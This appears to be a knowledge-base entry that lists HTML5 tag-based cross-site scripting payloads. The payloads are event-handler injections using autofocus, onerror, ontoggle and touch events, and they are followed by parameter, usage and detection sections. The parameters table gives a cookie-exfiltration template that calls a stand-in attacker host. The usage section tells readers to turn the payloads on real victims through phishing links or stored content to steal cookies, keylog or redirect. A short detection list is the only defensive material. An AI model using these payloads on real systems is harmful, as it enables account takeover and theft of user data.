---
id: cf003718-b25e-4e0a-9857-ba734a104339
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:41.824239+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xss
  - payload
  - html5
platforms:
  - Web
validated: true
---

# HTML5-Tag-Based-XSS-Payloads

## Code

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```

## Description

This code snippet contains a collection of HTML5 tag-based XSS payloads that inject elements with JavaScript event handlers to execute arbitrary code in the victim's browser. Each payload targets specific HTML5 features like autofocus for form elements, onerror for media loading failures, and ontouch events for mobile devices, allowing execution without <script> tags.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(1) | Placeholder for JavaScript execution; replace with data exfiltration like `fetch('http://attacker.com?cookie='+document.cookie)` | alert(document.cookie) |
| /XSS/.source | Regex-based alert variant for bypassing simple filters | /XSS/.source |

## Usage

Inject these payloads into vulnerable web application inputs (e.g., URL parameters, form fields) where HTML is reflected unsanitized. For testing, use in a reflected XSS context like ?q=<payload>. For production attacks, replace alert() with code to steal cookies, keylog, or redirect. Deliver via phishing links or stored content to lure victims.

## Detection

- Browser developer tools showing unexpected event firings or network requests from injected elements.
- WAF logs matching HTML5 event patterns (e.g., onload=, onfocus=) in inputs.
- CSP violations for inline JavaScript execution.
- Client-side monitoring for anomalous DOM modifications or media element errors.

## Related

- [[procedures/HTML5-Tag-Based-Cross-Site-Scripting]]
